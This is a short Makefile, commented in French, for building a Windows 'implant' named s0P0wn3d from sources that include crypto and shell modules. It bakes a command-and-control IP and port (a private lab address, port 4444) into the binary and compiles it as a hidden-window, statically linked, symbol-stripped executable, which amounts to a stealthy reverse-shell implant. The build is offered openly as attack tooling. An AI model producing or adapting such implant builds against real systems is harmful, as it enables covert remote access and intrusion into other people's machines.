# s0P0wn3d — Implant build
#
# Usage :
#   make cross   C2_IP=192.168.56.104 C2_PORT=4444   (cross-compile depuis Linux)
#   make windows C2_IP=192.168.56.104 C2_PORT=4444   (compile sur Windows avec MinGW)
#   make clean

C2_IP   ?= 192.168.56.104
C2_PORT ?= 4444

SRCS  = main.c aes.c crypto.c shell.c
FLAGS = -DCLIENT_IP=\"$(C2_IP)\" -DCLIENT_PORT=$(C2_PORT) -DWAIT_FOR_CLIENT
LIBS  = -lws2_32 -lbcrypt

cross:
	x86_64-w64-mingw32-gcc -o implant.exe $(SRCS) $(FLAGS) $(LIBS) \
		-mwindows -static -s -O2
	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT))"
	@ls -lh implant.exe

windows:
	gcc -o implant.exe $(SRCS) $(FLAGS) $(LIBS)
	@echo "[+] implant.exe généré"

clean:
	rm -f implant.exe
